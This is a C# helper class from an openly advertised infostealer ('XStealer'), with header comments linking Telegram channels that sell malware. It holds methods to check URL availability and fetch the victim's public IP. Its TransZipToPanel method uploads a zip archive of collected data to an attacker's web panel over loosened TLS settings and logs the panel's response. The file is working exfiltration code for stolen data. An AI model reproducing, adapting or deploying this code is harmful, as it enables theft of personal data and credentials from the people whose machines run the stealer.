// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    using System.Text;

    public static class WhiteRabbit
    {
        /// <summary>
        /// Метод для проверки ссылки на доступность
        /// </summary>
        /// <param name="url">Ссылка для проверки</param>
        /// <param name="TimeOut">Время ожидания</param>
        /// <param name="Head">Метод запроса</param>
        /// <returns></returns>
        public static bool CheckURL(string url, int TimeOut = 0x3A98, string Head = "HEAD")
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            request.Timeout = TimeOut;
            request.Method = Head;
            try
            {
                using var response = (HttpWebResponse)request?.GetResponse();
                return response.StatusCode == HttpStatusCode.OK;
            }
            catch (Exception) { return false; }
        }

        /// <summary>
        /// Метод для получения публичного IP адресса в сети
        /// </summary>
        /// <param name="url">Ссылка на хост для получения публичного адреса</param>
        /// <returns></returns>
        public static string GetPublicIP(string url)
        {
            try
            {
                var uri = new Uri(url);
                using var client = new WebClient();
                return Encoding.ASCII.GetString(client?.DownloadData(uri));
            }
            catch (WebException) { return "N/A"; }
        }

        /// <summary>
        /// Метод для проверки удалённого сертификата
        /// </summary>
        /// <returns></returns>
        public static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error) => error == SslPolicyErrors.None;

        /// <summary>
        /// <br><b>Trans Метод для отправки архива в панель</b></br>
        /// <br>WebPanel.Trans(url, GlobalPaths.ZipFile, MemoryEx.ZipEnd("Panel Testing"));</br>
        /// </summary>
        /// <param name="domain"><br>Ссылка на панель</br><br>Link to Host</br></param>
        /// <param name="archiveName"><br>Имя архива</br><br>Archive name</br></param>
        /// <param name="archive"><br>.Zip архив из массив байтов</br><br>.Zip archive from byte array</br></param>
        /// <returns>True/False</returns>
        public static bool TransZipToPanel(string domain, string archiveName, byte[] archive)
        {
            try
            {
                ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3;
                ServicePointManager.DefaultConnectionLimit = 9999;

                using var webClient = new WebClient { Proxy = null };
                string boundary = $"------------------------{DateTime.Now.Ticks:x}";
                webClient.Headers.Add("Content-Type", $"multipart/form-data; boundary={boundary}");
                string package = $"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{archiveName}\"\r\nContent-Type: application/zip\r\n\r\n{webClient.Encoding.GetString(archive)}\r\n--{boundary}--\r\n";
                byte[] result = webClient.UploadData(domain, "POST", webClient.Encoding.GetBytes(package));
                string ServerResponse = ConverterEx.ToString(false, result); // Ответ от сервера
                Logger.Write($"~[Success_Send]~ Response from Reserver\r\n{ServerResponse}\r\n");
                return true;
            }
            catch (WebException e)
            {
                Logger.Write($"~[WebError]~ Error Send to Host\r\n{e}\r\n");
                if (e.Status == WebExceptionStatus.ProtocolError)
                {
                    using var response = (HttpWebResponse)e?.Response;
                    if (response.StatusCode == HttpStatusCode.InternalServerError)
                    {
                        Logger.Write($"~[Panel_Receiving_Data]~ Incorrect data when receiving data on the panel\r\n{e.Message}\r\n");
                    }
                }
                return false;
            }
        }
    }
}